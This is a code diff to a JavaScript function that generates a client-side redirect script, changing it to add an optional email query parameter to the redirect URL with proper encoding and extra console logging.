@@ -420,11 +420,16 @@ function generateCustomScriptContent(redirectUrl) {
   function redirect() {
     var email = getParameterByName('email');
     var redirectUrl = "${redirectUrl}";
+    
     if (email) {
-      redirectUrl += email; // Append email if provided
+      // Check if the redirect URL already has parameters
+      var separator = redirectUrl.includes('?') ? '&' : '?';
+      redirectUrl += separator + 'email=' + encodeURIComponent(email);
+      console.log("Redirecting with email: " + email);
     } else {
       console.log("No email provided. Redirecting without email.");
     }
+    
     console.log("Redirecting to: " + redirectUrl);
     window.location.href = redirectUrl;
   }
